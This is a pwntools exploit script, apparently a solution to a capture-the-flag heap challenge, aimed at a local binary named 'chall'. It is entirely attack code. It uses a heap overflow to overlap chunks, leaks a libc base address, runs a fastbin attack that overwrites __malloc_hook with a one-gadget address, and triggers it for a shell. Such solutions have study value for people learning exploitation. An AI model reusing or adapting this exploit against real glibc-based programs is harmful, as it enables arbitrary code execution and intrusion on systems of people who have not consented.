from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(":",str(size))
def free(idx):
	cmd(4)
	p.sendlineafter("id:",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:",str(idx))
	p.sendafter(":",c)
p=process("./chall")
libc=ELF("./chall").libc

add(0x200)
add(0x88)
add(0x18)
free(0)
add(0x18)
edit(0,"A"*0x18)
add(0x88)#3
add(0x18)#4
free(3)
free(1)
add(0x48)#1
add(0x88)#3
show(4)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
log.warning(hex(base))
add(0x68)#
free(5)
libc.address=base
edit(4,p64(libc.symbols['__malloc_hook']-35)+'\n')
one=0xf02a4
add(0x68)
add(0x68)
edit(6,"\x00"*19+p64(one+base)+'\n')
free(6)
gdb.attach(p,'b *0x000555555554DDD')

p.interactive()
